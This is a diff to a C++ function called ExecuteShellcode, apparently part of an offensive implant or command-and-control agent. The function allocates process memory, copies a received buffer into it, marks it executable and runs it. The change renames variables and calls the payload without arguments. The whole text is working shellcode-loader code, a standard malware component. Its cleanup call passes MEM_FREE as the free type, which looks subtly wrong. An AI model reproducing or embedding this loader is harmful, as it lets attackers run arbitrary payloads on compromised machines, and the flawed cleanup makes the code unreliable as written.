@@ -446,27 +446,27 @@ namespace Memory {
         VOID ExecuteShellcode(_parser &parser) {
             HEXANE
 
-            void *exec  = { };
-            _command cmd = { };
+            void *address  = { };
+            void (*exec)() = { };
             size_t size = parser.Length;
 
-            if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtAllocateVirtualMemory(NtCurrentProcess(), &exec, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
+            if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtAllocateVirtualMemory(NtCurrentProcess(), &address, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
                 return_defer(ntstatus);
             }
 
-            x_memcpy(exec, parser.Buffer, parser.Length);
-            if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(NtCurrentProcess(), &exec, &size, PAGE_EXECUTE_READ, nullptr))) {
+            x_memcpy(address, parser.Buffer, parser.Length);
+            if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(NtCurrentProcess(), &address, &size, PAGE_EXECUTE_READ, nullptr))) {
                 return_defer(ntstatus);
             }
 
-            cmd = R_CAST(_command, exec);
-            cmd(&parser);
+            exec = R_CAST(void(*)(), address);
+            exec();
 
-            x_memset(exec, 0, size);
+            x_memset(address, 0, size);
 
             defer:
-            if (exec) {
-                if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtFreeVirtualMemory(NtCurrentProcess(), &exec, &size, MEM_FREE))) {
+            if (address) {
+                if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtFreeVirtualMemory(NtCurrentProcess(), &address, &size, MEM_FREE))) {
                     return_defer(ntstatus);
                 }
             }
